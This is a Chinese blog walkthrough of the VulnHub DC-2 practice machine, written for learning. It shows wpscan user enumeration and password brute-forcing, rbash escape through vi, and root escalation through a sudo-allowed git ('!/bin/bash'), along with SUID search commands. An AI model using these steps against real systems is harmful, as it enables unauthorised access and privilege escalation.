<!DOCTYPE html>
<html lang="zh">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="renderer" content="webkit">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
    <title>
        何止
    </title>
    
<link rel="stylesheet" href="/libs/highlight/styles/monokai-sublime.css">

    
<link rel="stylesheet" href="/libs/font-awesome/css/font-awesome.min.css">

    
<link rel="stylesheet" href="/css/style.css">

<meta name="generator" content="Hexo 5.4.0"></head>

<body id="bodyx">
    <div class="hd posts">
    <a href="/index.html"><i class="fa fa-reply replay-btn" aria-hidden="true"></i></a>
    <div class="post-title">
        <p>
            DC系列靶机第二篇
        </p>
        <hr>
    </div>
    <div class="post-content">
        <p>终于闲下来了，继续搞一搞</p>
<blockquote>
<p>  资源地址：<a target="_blank" rel="noopener" href="https://download.vulnhub.com/dc/DC-2.zip">https://download.vulnhub.com/dc/DC-2.zip</a></p>
<p>  本机：192.168.3.15</p>
<p>  靶机：192.168.3.18</p>
</blockquote>
<h2 id="1-信息收集"><a href="#1-信息收集" class="headerlink" title="1. 信息收集"></a>1. 信息收集</h2><p>Netdiscover是一种网络扫描工具，通过ARP扫描发现活动主机，可以通过主动和被动两种模式进行ARP扫描。通过主动发送ARP请求检查网络ARP流量，通过自动扫描模式扫描网络地址。</p>
<h3 id="netdiscover"><a href="#netdiscover" class="headerlink" title="netdiscover"></a>netdiscover</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netdiscover -i eth0 -r 192.168.3.0/24</span><br></pre></td></tr></table></figure>

<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gy1ady5ssrj30hu0e7ta2.jpg" alt="image-20220104055126098"></p>
<h3 id="masscan"><a href="#masscan" class="headerlink" title="masscan"></a>masscan</h3><p>因为虚拟机出问题了ip换成18了</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">masscan -p80 192.168.3.0/24</span><br></pre></td></tr></table></figure>

<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gy1ae1abkcj30h803taak.jpg" alt="image-20220104061411939"></p>
<h2 id="2-漏洞发现利用"><a href="#2-漏洞发现利用" class="headerlink" title="2. 漏洞发现利用"></a>2. 漏洞发现利用</h2><p>访问发现了flag1，发现了提示“或许你可以尝试cewl”</p>
<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gy1ae4p213j30po0gmdgr.jpg" alt="image-20220104055509829"></p>
<h3 id="cewl"><a href="#cewl" class="headerlink" title="cewl"></a>cewl</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cewl dc-2 &gt; dc-2pwd.txt</span><br></pre></td></tr></table></figure>

<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gy1ae7zt6mj30he0bh3z2.jpg" alt="image-20220104062235864"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url http:&#x2F;&#x2F;dc-2&#x2F; -e u</span><br></pre></td></tr></table></figure>

<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gy1aebrjlbj30hq09udhe.jpg" alt="image-20220104062201195"></p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url http://dc-2/ -U dc-2user.txt -P dc-2pwd.txt </span><br></pre></td></tr></table></figure>

<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gy1aeeitndj30kp0epq66.jpg" alt="image-20220104062900271"></p>
<p>登陆jerry后发现flag2，可以使用其他办法</p>
<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gy18xc1nsfj30gj0f874s.jpg" alt="image-20220104063042724"></p>
<h3 id="ssh"><a href="#ssh" class="headerlink" title="ssh"></a>ssh</h3><p>ssh被拒绝了，后扫描发现7744端口开着</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo masscan --rate=10000 --port 0-65535 192.168.3.18 </span><br></pre></td></tr></table></figure>

<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gy18xbcu8kj30gy04caat.jpg" alt="image-20220104063610583"></p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -p 7744 tom@192.168.3.18 <span class="comment">#parturient</span></span><br></pre></td></tr></table></figure>

<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gy18xeazpaj30pj091mz6.jpg" alt="image-20220104063736520"></p>
<p>然后发现cat不能用，shell使用的rbash，可以使用vi读取文件，或者less也可。把常用的指令都试试就出了。</p>
<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gy1aend2n9j30rz02h0sv.jpg" alt="image-20220104070048688"></p>
<p>flag3提示“需要su登陆jerry”</p>
<h2 id="3-提权部分"><a href="#3-提权部分" class="headerlink" title="3. 提权部分"></a>3. 提权部分</h2><h3 id="突破rbash"><a href="#突破rbash" class="headerlink" title="突破rbash"></a>突破rbash</h3><p>可以使用vi突破限制，参考<a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1680551">https://cloud.tencent.com/developer/article/1680551</a></p>
<p>这里可以使用vi末行输入<code>setshell=/bin/bash 然后 shell</code>，但是cat仍然不可用，可以ls或者使用tab键找可以使用的指令</p>
<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gy1aeqkja4j30rn0gjdj6.jpg" alt="image-20220104065805501"></p>
<p>为了使用su，必须把su到PATH环境变量，当然此时cat等命令也可以用了</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> PATH=/usr/sbin:/usr/bin:/sbin:/bin</span><br><span class="line">su jerry <span class="comment">#切换为jerry 密码:adipiscing</span></span><br></pre></td></tr></table></figure>

<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gy1aerxz8ej30qv0c7jtg.jpg" alt="image-20220104071132750"></p>
<p>通过cat获得jerry的flag4.txt，尝试提权发现可以用的(nmap、vim、find、bash、more、less、nano、cp)</p>
<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gy1aexbp3uj30gh08z3zh.jpg" alt="image-20220104071329932"></p>
<h3 id="尝试less提权"><a href="#尝试less提权" class="headerlink" title="尝试less提权"></a>尝试less提权</h3><p>发现less并不是很行</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">less /etc/passwd</span><br><span class="line">!/bin/sh</span><br></pre></td></tr></table></figure>

<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gy1aezjgjzj30f6029dfv.jpg" alt="image-20220104071614282"></p>
<h3 id="git提权"><a href="#git提权" class="headerlink" title="git提权"></a>git提权</h3><p>阅读他人的文章发现git也是可以提权的</p>
<p>使用sudo -l可以找到git直接是root用户权限</p>
<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gy1af1kvg8j30ty038gm4.jpg" alt="image-20220104071843646"></p>
<p>参考<a target="_blank" rel="noopener" href="https://gtfobins.github.io/gtfobins/git/">https://gtfobins.github.io/gtfobins/git/</a></p>
<p>提权方法如下</p>
<ol>
<li><p><code>sudo git help config</code>在末行命令模式输入 <code>!/bin/bash</code> 或<code> !&#39;sh&#39;</code> #完成提权 </p>
<p> <img src="https://tva1.sinaimg.cn/large/008i3skNly1gy1af4qrvsj30as01qt8l.jpg" alt="image-20220104072223004"></p>
</li>
<li><p> <code>sudo git -p help</code>  #输入<code>!/bin/bash</code>，即可打开一个用户为root的shell</p>
</li>
</ol>
<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gy1af7ecsaj30nh0ds778.jpg" alt="image-20220104072338489"></p>
<p>注意 : 想提权获得“末行命令模式输入”，尽量保证窗口小一些，使得回显信息不能一页显示，否则是不能输入的，像下面这样……</p>
<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gy1afb80b5j30ng0fh77v.jpg" alt="image-20220104072530822"></p>
<h3 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h3><p>在我们获得了root之后就可以拿到flag了</p>
<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gy1afg4kigj30gf0aldgy.jpg" alt="image-20220104072725788"></p>
<h2 id="4-小结"><a href="#4-小结" class="headerlink" title="4. 小结"></a>4. 小结</h2><h3 id="tips"><a href="#tips" class="headerlink" title="tips"></a>tips</h3><ol>
<li><p> <code>sudo -l</code>可以查看root下的一些指令</p>
</li>
<li><p>suid提权，已知的可用来提权的linux可行性的文件列表：nmap、vim、find、bash、more、less、nano、cp</p>
 <figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#以下命令将尝试查找具有root权限的SUID的文件，不同系统适用于不同的命令，一个一个试</span></span><br><span class="line">find / -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null</span><br><span class="line">find / -user root -perm -4000-print2&gt;/dev/null</span><br><span class="line">find / -user root -perm -4000-exec ls -ldb &#123;&#125; \;</span><br></pre></td></tr></table></figure></li>
<li><p>cewl可以爬取页面信息生成密码</p>
 <figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cewl dc-2 &gt; dc-2pwd.txt</span><br></pre></td></tr></table></figure></li>
<li><p>wpscan这是一款Wordpress的专用扫描器</p>
 <figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url http://dc-2/ -e u   用户枚举</span><br><span class="line">wpscan --url http://dc-2/ -U user.txt -P password.txt</span><br></pre></td></tr></table></figure>

<p> <img src="https://tva1.sinaimg.cn/large/008i3skNly1gy1b30jj3fj30qo0e43z4.jpg" alt="image-20220104075255689"></p>
</li>
</ol>
<h3 id="参考文章："><a href="#参考文章：" class="headerlink" title="参考文章："></a>参考文章：</h3><p>git提权：<a target="_blank" rel="noopener" href="https://gtfobins.github.io/gtfobins/git/">https://gtfobins.github.io/gtfobins/git/</a></p>
<p>rbash突破限制：<a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1680551">https://cloud.tencent.com/developer/article/1680551</a></p>

    </div>

    
        <hr class="fhr">
        <div id="vcomments"></div>
    
</div>
    <div class="footer" id="footer">
    <p>Copyright © 2020 <a class="flink" target="_blank" rel="noopener" href="https://hexo.io">Hexo</a>-<a class="flink" target="_blank" rel="noopener" href="https://github.com/sanjinhub/hexo-theme-geek">Geek</a>.
        <label class="el-switch el-switch-green el-switch-sm" style="vertical-align: sub;">
            <input type="checkbox" name="switch" id="update_style">
            <span class="el-switch-style"></span>
        </label>
<!--         <script type="text/javascript">
        var cnzz_protocol = (("https:" == document.location.protocol) ? "https://" : "http://");
        document.write(unescape("%3Cspan id='cnzz_stat_icon_1278548644'%3E%3C/span%3E%3Cscript src='" + cnzz_protocol + "v1.cnzz.com/stat.php%3Fid%3D1278548644%26show%3Dpic1' type='text/javascript'%3E%3C/script%3E"));
        </script> -->
    </p>
</div>
<input type="hidden" id="web_style" value="black">
<input type="hidden" id="valine_appid" value="">
<input type="hidden" id="valine_appKey" value="">

<script src="/libs/jquery.min.js"></script>


<script src="/libs/highlight/highlight.pack.js"></script>

<script src='//cdn.jsdelivr.net/npm/valine@1.3.10/dist/Valine.min.js'></script>

<script src="/js/js.js"></script>

<style type="text/css">
.v * {
    color: #698fca;
}

.v .vlist .vcard .vhead .vsys {
    color: #3a3e4a;
}

.v .vlist .vcard .vh .vmeta .vat {
    color: #638fd5;
}

.v .vlist .vcard .vhead .vnick {
    color: #6ba1ff;
}

.v a {
    color: #8696b1;
}

.v .vlist .vcard .vhead .vnick:hover {
    color: #669bfc;
}
</style>
</body>

</html>